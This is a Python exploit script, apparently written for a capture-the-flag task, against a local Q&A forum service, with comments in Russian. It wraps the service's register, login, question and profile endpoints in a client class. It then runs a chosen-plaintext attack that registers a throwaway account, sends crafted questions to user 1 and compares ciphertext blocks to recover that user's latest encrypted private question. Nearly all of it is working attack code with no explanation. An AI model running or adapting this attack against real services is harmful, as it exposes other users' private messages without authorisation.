import requests
from itertools import product
class ForumClient:
    def __init__(self, base_url="http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()  # сохраняет cookies (хотя JWT — stateless)
        self.token = None

    def _set_auth_header(self):
        if self.token:
            self.session.headers.update({"Authorization": f"Bearer {self.token}"})
        else:
            self.session.headers.pop("Authorization", None)

    def register(self, username, password, keyword):
        """Регистрация нового пользователя"""
        response = self.session.post(
            f"{self.base_url}/auth/register",
            json={"username": username, "password": password, "keyword": keyword}
        )
        response.raise_for_status()
        return response.json()

    def login(self, username, password):
        """Вход и сохранение токена"""
        response = self.session.post(
            f"{self.base_url}/auth/login",
            json={"username": username, "password": password}
        )
        response.raise_for_status()
        self.token = response.json()["access_token"]
        self._set_auth_header()  # устанавливаем заголовок для последующих запросов
        return self.token

    def ask_question(self, recipient_id, text):
        """Отправка вопроса (требует авторизации)"""
        response = self.session.post(
            f"{self.base_url}/questions",
            json={"recipient_id": recipient_id, "text": text}
        )
        response.raise_for_status()
        return response.json()

    def get_my_questions(self):
        """Получение входящих вопросов (требует авторизации)"""
        response = self.session.get(f"{self.base_url}/questions/my")
        response.raise_for_status()
        return response.json()

    def get_user_profile(self, user_id):
        """Просмотр профиля другого пользователя"""
        response = self.session.get(f"{self.base_url}/users/{user_id}")
        response.raise_for_status()
        return response.json()

    def logout(self):
        """Выход (опционально)"""
        if self.token:
            self.session.post(f"{self.base_url}/auth/logout")
            self.token = None
            self._set_auth_header()


def attack(userid):
    session=ForumClient()
    username='random_nickname3'
    password='random_password'
    keyword='no_matter'
    session.register(username, password, keyword)
    session.login(username, password)
    l=session.get_user_profile(userid)
    chiphertext=bytes.fromhex(l['questions_received'][-1]['text'])
    blocks=len(chiphertext)//16
    spis=list('zxcvbnmasdfghjklqwertyuiop1234567890{}_ ?ZXCVBNMASDFGHJKLQWERTYUIOP')
    text=['']*(16*blocks)
    #Обработка символов
    for symbol in spis:
        pt=symbol*(16*blocks)
        session.ask_question(userid, pt)
        l=session.get_user_profile(userid)
        ct=bytes.fromhex(l['questions_received'][-1]['text'])
        for i in range(blocks):
            for j in range(8, 16):
                if ct[16*i+j]==chiphertext[16*i+j] and (bytes([pt.encode()[j-8+16*i]^ct[j-8+16*i]^chiphertext[j-8+16*i]])) in b'zxcvbnmasdfghjklqwertyuiop1234567890{}_ ?ZXCVBNMASDFGHJKLQWERTYUIOP':
                    text[16*i+j]=text[16*i+j]+symbol
                    text[j-8+16*i]=text[j-8+16*i]+(bytes([pt.encode()[j-8+16*i]^ct[j-8+16*i]^chiphertext[j-8+16*i]])).decode()
    
    for p in  product(*[list(s) for s in text]):
        print(''.join(list(p)))
    



#Атакуем последний вопрос пользователя с id 1
attack(1)
